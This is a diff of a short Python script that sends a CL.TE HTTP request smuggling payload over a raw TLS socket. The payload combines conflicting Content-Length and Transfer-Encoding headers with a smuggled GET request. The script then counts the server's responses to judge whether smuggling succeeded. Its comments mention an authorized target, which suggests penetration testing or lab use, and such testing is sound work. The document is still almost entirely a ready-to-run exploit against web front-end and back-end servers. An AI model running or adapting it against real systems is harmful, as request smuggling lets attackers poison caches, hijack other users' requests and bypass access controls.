@@ -1,26 +1,27 @@
 import socket
 import ssl
 
-host = "enter host here"  # ← Replace this with the real host
+host = "enter host here"  # Replace this with your authorized target
 port = 443
 
-# First request: main request + smuggled request (CL.CL style attempt)
-first_request = (
+# CL.TE Smuggling Payload:
+# Front-end honors Content-Length: 4 (so ends at "0\r\n\r\n")
+# Back-end honors Transfer-Encoding: chunked and sees the 2nd request
+smuggled_request = (
     "POST / HTTP/1.1\r\n"
     f"Host: {host}\r\n"
-    "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Content-Length: 0\r\n"
+    "Content-Length: 4\r\n"
+    "Transfer-Encoding: chunked\r\n"
     "Connection: keep-alive\r\n"
     "\r\n"
-    "POST /robots.txt HTTP/1.1\r\n"
+    "0\r\n\r\n"
+    "GET /robots.txt HTTP/1.1\r\n"
     f"Host: {host}\r\n"
-    "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Content-Length: 20\r\n"
+    "Connection: close\r\n"
     "\r\n"
-    "abc"
 )
 
-# Second request
+# Follow-up request to trigger response
 second_request = (
     "GET / HTTP/1.1\r\n"
     f"Host: {host}\r\n"
@@ -28,18 +29,18 @@ second_request = (
     "\r\n"
 )
 
-# Create insecure SSL context (for lab testing)
+# Create SSL context
 context = ssl._create_unverified_context()
 
 with socket.create_connection((host, port)) as sock:
     with context.wrap_socket(sock, server_hostname=host) as ssock:
-        print("[+] Sending the requests...")
+        print("[+] Sending requests...")
 
-        # Send both requests over the same connection
-        ssock.sendall(first_request.encode())
+        # Send smuggled request + follow-up
+        ssock.sendall(smuggled_request.encode())
         ssock.sendall(second_request.encode())
 
-        # Read full response
+        # Receive responses
         response_data = b""
         ssock.settimeout(2)
         try:
@@ -57,11 +58,10 @@ with socket.create_connection((host, port)) as sock:
 
         if len(parts) < 3:
             print("\n❌ Smuggled request did NOT go through — only one response received.")
-            print("\n🧪 Full server response for debugging:\n")
-            print(full_response[:1500])  # Print first 1500 chars for context
+            print("\n🧪 Full raw server response:\n")
+            print(full_response[:1500])  # Show up to 1500 characters for analysis
         else:
             print(f"\n✅ Received {len(parts) - 1} HTTP responses — possible smuggling success!")
-
             for idx, part in enumerate(parts[1:], start=1):
                 print(f"\n---------------- Response #{idx} ----------------")
-                print("HTTP/1.1 " + part[:600])  # Print first 600 chars per response
+                print("HTTP/1.1 " + part[:600])  # Trim to avoid terminal flood
